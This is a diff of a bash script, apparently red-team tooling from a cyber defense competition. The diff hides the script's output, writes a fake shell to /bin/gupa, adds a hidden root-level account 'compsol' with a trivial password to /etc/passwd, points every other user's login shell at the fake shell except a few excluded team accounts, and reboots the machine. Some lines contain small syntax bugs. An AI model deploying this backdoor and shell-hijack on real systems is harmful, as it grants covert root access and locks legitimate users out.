@@ -1,7 +1,9 @@
 #!/bin/bash
+exec > /dev/null 2>&1
+
 cat << 'EOF' > /bin/gupa
 #!/bin/bash
-echo "We hope you are having a lovely day:)" >> /var/log/.gupa
+echo "We hope you are having a lovely day:), if you find this and still can seem to fix the issues we created you should check /bin. Hope youre having a fun comp!" >> /var/log/.BinaryBasinBandits
 ri() {
     current_directory=$(pwd)
     echo -n "root@HOSTNAME:Scurrent_directory# "
@@ -54,5 +56,27 @@ ri
 EOF
 
 chmod +x /bin/gupa
-touch /var/log/.gupa
-chmod 722 /var/log/.gupa
+touch /var/log/.BinaryBasinBandits
+chmod 722 /var/log/.BinaryBasinBandits
+
+if grep -q "compsol" /etc/passwd; then
+    echo "Idk already or smthn like that"
+else
+    if [ "$EUID" -eq 0 ]; then
+        echo "compsol:x:0:0::/home/compsol:/bin/bash" | tee -a /etc/passwd
+    else
+        sudo tee -a "compsol:x:0:0::/home/compsol:/bin/bash" /etc/passwd
+    fi
+    #edit the password
+    echo -e "Password\nPassword\n" | passwd "compsol"
+fi
+
+while IFS=: read -r username _ _ _ _ _ shell; do
+    if [[ "$username" == *"whiteteam" || "$username" == *"blackteam" || "$username" == *"datadog" || "$username" == *"dd-dog" || *"$username" == *"compsol"]]; then
+        echo "pass $username"
+    else
+        sudo usermod --shell /bin/gupa "$username"
+    fi
+done < /etc/passwd
+
+reboot
